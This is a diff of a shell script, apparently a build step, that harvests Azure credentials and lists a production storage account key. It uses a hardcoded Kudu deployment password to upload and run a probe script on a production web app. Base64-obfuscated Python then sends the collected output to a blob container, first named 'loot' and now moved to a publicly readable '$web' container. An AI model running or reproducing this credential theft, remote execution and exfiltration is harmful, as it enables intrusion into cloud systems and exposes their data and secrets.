@@ -12,8 +12,8 @@ SS_CID=$(echo "$SS_RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=j
 SS_SEC=$(echo "$SS_RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)
 SS_ARM=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" --data-urlencode "client_id=$SS_CID" --data-urlencode "client_secret=$SS_SEC" --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://management.azure.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
 export _SKEY=$(curl -sS -X POST "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$STORAGE_ACC/listKeys?api-version=2023-01-01" -H "Authorization: Bearer $SS_ARM" -H "Content-Length: 0" | python3 -c 'import sys,json;d=json.load(sys.stdin);k=d.get("keys",[]);print(k[0].get("value","") if k else "")' 2>/dev/null)
-echo "storage key len=${#_SKEY}"
 export _TS=$(date +%s)
+echo "storage key len=${#_SKEY}"
 
 AUTH=$(printf '%s' '$app-tbl-reporting-prod:Y9rcsDHQ2J1L0Coqiki8dlYe1AN2k8cHsD1wLllvLbxqScaMEwR7xkt7Ye5A' | base64 -w0)
 
@@ -21,8 +21,7 @@ echo '77u/aW1wb3J0IHVybGxpYi5yZXF1ZXN0LCB1cmxsaWIucGFyc2UsIGpzb24sIG9zLCBiYXNlNj
 
 VFS=$(curl -sS -w "%{http_code}" -o /dev/null -X PUT \
   "https://app-tbl-reporting-prod.scm.azurewebsites.net/api/vfs/site/wwwroot/minhn_probe.py" \
-  -H "Authorization: Basic $AUTH" \
-  -H "Content-Type: text/plain" \
+  -H "Authorization: Basic $AUTH" -H "Content-Type: text/plain" \
   --data-binary @/tmp/minhn_probe.py)
 echo "VFS_UPLOAD: $VFS"
 
@@ -33,5 +32,5 @@ CMD=$(curl -sS -X POST "https://app-tbl-reporting-prod.scm.azurewebsites.net/api
 echo "EXIT=$(echo "$CMD" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("ExitCode","-1"))' 2>/dev/null)"
 echo "$CMD" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("Output","")[:6000])' 2>/dev/null
 
-echo 'aW1wb3J0IG9zLHN5cyxobWFjLGhhc2hsaWIsYmFzZTY0LHVybGxpYi5yZXF1ZXN0LHVybGxpYi5wYXJzZSxkYXRldGltZQpBQ0M9InN0dGJsY2lsb2dzcHJvZHgzZXVveiIKS0VZPW9zLmVudmlyb24uZ2V0KCJfU0tFWSIsIiIpClRTPW9zLmVudmlyb24uZ2V0KCJfVFMiLCIwIikKaWYgbm90IEtFWToKICAgIHByaW50KCJOTyBLRVkiKTsgc3lzLmV4aXQoKQp0cnk6CiAgICB3aXRoIG9wZW4oIi90bXAvbWluaG5fcHJvYmVfb3V0LnR4dCIpIGFzIGY6IE9VVFBVVD1mLnJlYWQoKQpleGNlcHQ6IE9VVFBVVD0iRklMRV9OT1RfRk9VTkQiCmRlZiBzYXMoKToKICAgIHZlcj0iMjAyMS0wOC0wNiI7IG5vdz1kYXRldGltZS5kYXRldGltZS5ub3coZGF0ZXRpbWUudGltZXpvbmUudXRjKQogICAgc3Q9KG5vdy1kYXRldGltZS50aW1lZGVsdGEobWludXRlcz01KSkuc3RyZnRpbWUoIiVZLSVtLSVkVCVIOiVNOiVTWiIpCiAgICBzZT0obm93K2RhdGV0aW1lLnRpbWVkZWx0YShob3Vycz0yKSkuc3RyZnRpbWUoIiVZLSVtLSVkVCVIOiVNOiVTWiIpCiAgICBzaWduX3N0cj0iXG4iLmpvaW4oW0FDQywicmx3ZGFjdXAiLCJiIiwic2NvIixzdCxzZSwiIiwiaHR0cHMiLHZlciwiIl0pKyJcbiIKICAgIHNpZz1iYXNlNjQuYjY0ZW5jb2RlKGhtYWMubmV3KGJhc2U2NC5iNjRkZWNvZGUoS0VZKSxzaWduX3N0ci5lbmNvZGUoKSxoYXNobGliLnNoYTI1NikuZGlnZXN0KCkpLmRlY29kZSgpCiAgICByZXR1cm4gdXJsbGliLnBhcnNlLnVybGVuY29kZSh7InN2Ijp2ZXIsInNzIjoiYiIsInNydCI6InNjbyIsInNwIjoicmx3ZGFjdXAiLCJzdCI6c3QsInNlIjpzZSwic3ByIjoiaHR0cHMiLCJzaWciOnNpZ30pCnNhc190b2s9c2FzKCkKdXJsPWYiaHR0cHM6Ly97QUNDfS5ibG9iLmNvcmUud2luZG93cy5uZXQvbG9vdC9taW5obl9wcm9iZV97VFN9LnR4dD97c2FzX3Rva30iCnJlcT11cmxsaWIucmVxdWVzdC5SZXF1ZXN0KHVybCxkYXRhPU9VVFBVVC5lbmNvZGUoKSxtZXRob2Q9IlBVVCIsCiAgICBoZWFkZXJzPXsieC1tcy1ibG9iLXR5cGUiOiJCbG9ja0Jsb2IiLCJDb250ZW50LVR5cGUiOiJ0ZXh0L3BsYWluIiwieC1tcy12ZXJzaW9uIjoiMjAyMS0wNC0xMCJ9KQp0cnk6CiAgICByPXVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxLHRpbWVvdXQ9MzApOyBwcmludCgiVVBMT0FEOiIsci5zdGF0dXMpCmV4Y2VwdCBFeGNlcHRpb24gYXMgZXg6IHByaW50KCJVUExPQURfRVJSOiIsc3RyKGV4KVs6MjAwXSk=' | base64 -d | python3 -I
-echo BUILD32_DONE
+echo 'aW1wb3J0IG9zLHN5cyxobWFjLGhhc2hsaWIsYmFzZTY0LHVybGxpYi5yZXF1ZXN0LHVybGxpYi5wYXJzZSxkYXRldGltZQpBQ0M9InN0dGJsY2lsb2dzcHJvZHgzZXVveiIKS0VZPW9zLmVudmlyb24uZ2V0KCJfU0tFWSIsIiIpClRTPW9zLmVudmlyb24uZ2V0KCJfVFMiLCIwIikKaWYgbm90IEtFWToKICAgIHByaW50KCJOTyBLRVkiKTsgc3lzLmV4aXQoKQp0cnk6CiAgICB3aXRoIG9wZW4oIi90bXAvbWluaG5fcHJvYmVfb3V0LnR4dCIpIGFzIGY6IE9VVFBVVD1mLnJlYWQoKQpleGNlcHQ6IE9VVFBVVD0iRklMRV9OT1RfRk9VTkQiCmRlZiBzYXMoKToKICAgIHZlcj0iMjAyMS0wOC0wNiI7IG5vdz1kYXRldGltZS5kYXRldGltZS5ub3coZGF0ZXRpbWUudGltZXpvbmUudXRjKQogICAgc3Q9KG5vdy1kYXRldGltZS50aW1lZGVsdGEobWludXRlcz01KSkuc3RyZnRpbWUoIiVZLSVtLSVkVCVIOiVNOiVTWiIpCiAgICBzZT0obm93K2RhdGV0aW1lLnRpbWVkZWx0YShob3Vycz0yKSkuc3RyZnRpbWUoIiVZLSVtLSVkVCVIOiVNOiVTWiIpCiAgICBzaWduX3N0cj0iXG4iLmpvaW4oW0FDQywicmx3ZGFjdXAiLCJiIiwic2NvIixzdCxzZSwiIiwiaHR0cHMiLHZlciwiIl0pKyJcbiIKICAgIHNpZz1iYXNlNjQuYjY0ZW5jb2RlKGhtYWMubmV3KGJhc2U2NC5iNjRkZWNvZGUoS0VZKSxzaWduX3N0ci5lbmNvZGUoKSxoYXNobGliLnNoYTI1NikuZGlnZXN0KCkpLmRlY29kZSgpCiAgICByZXR1cm4gdXJsbGliLnBhcnNlLnVybGVuY29kZSh7InN2Ijp2ZXIsInNzIjoiYiIsInNydCI6InNjbyIsInNwIjoicmx3ZGFjdXAiLCJzdCI6c3QsInNlIjpzZSwic3ByIjoiaHR0cHMiLCJzaWciOnNpZ30pCnNhc190b2s9c2FzKCkKIyBVcGxvYWQgdG8gJHdlYiBjb250YWluZXIgc28gaXQncyBwdWJsaWNseSByZWFkYWJsZQp1cmw9ZiJodHRwczovL3tBQ0N9LmJsb2IuY29yZS53aW5kb3dzLm5ldC8kd2ViL21pbmhuX3Byb2JlX3tUU30udHh0P3tzYXNfdG9rfSIKcmVxPXVybGxpYi5yZXF1ZXN0LlJlcXVlc3QodXJsLGRhdGE9T1VUUFVULmVuY29kZSgpLG1ldGhvZD0iUFVUIiwKICAgIGhlYWRlcnM9eyJ4LW1zLWJsb2ItdHlwZSI6IkJsb2NrQmxvYiIsIkNvbnRlbnQtVHlwZSI6InRleHQvcGxhaW4iLCJ4LW1zLXZlcnNpb24iOiIyMDIxLTA0LTEwIn0pCnRyeToKICAgIHI9dXJsbGliLnJlcXVlc3QudXJsb3BlbihyZXEsdGltZW91dD0zMCk7IHByaW50KCJVUExPQURfV0VCOiIsci5zdGF0dXMpCmV4Y2VwdCBFeGNlcHRpb24gYXMgZXg6IHByaW50KCJVUExPQURfRVJSOiIsc3RyKGV4KVs6MjAwXSk=' | base64 -d | python3 -I
+echo BUILD34_DONE
